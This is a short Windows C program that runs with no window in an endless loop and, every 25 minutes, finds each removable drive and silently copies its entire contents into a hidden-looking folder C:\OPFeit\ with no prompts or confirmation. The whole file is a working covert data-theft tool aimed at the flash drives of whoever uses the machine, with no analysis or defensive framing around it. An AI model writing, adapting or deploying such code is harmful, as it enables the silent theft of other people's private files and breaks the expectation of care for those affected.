#include <windows.h>


int WINAPI WinMain (HINSTANCE hThisInstance, HINSTANCE hPrevInstance, LPSTR lpszArgument, int nFunsterStil) {
    SHFILEOPSTRUCTA fop;
    WIN32_FIND_DATA FindFileData;
    HANDLE hFind;
    char drive[] = "A:\\";
    char from[] = "A:\\*\0";

    while(1) {
        CreateDirectory("C:\\OPFeit\\", 0);
            for (drive[0]='A';drive[0]!='Z'+1;drive[0]++)
                if (GetDriveType(drive) == DRIVE_REMOVABLE) { // flash disk najden!
                   from[0] = drive[0]; fop.pFrom = from;
                   fop.pTo = "C:\\OPFeit\\\0";
                   fop.hwnd = NULL; 
                   fop.wFunc = FO_COPY; 
                   fop.fFlags = FOF_SILENT + FOF_NOCONFIRMATION;
                   SHFileOperation(&fop);
                }

        Sleep(1500000); //25 min
    }

    return 0;
}
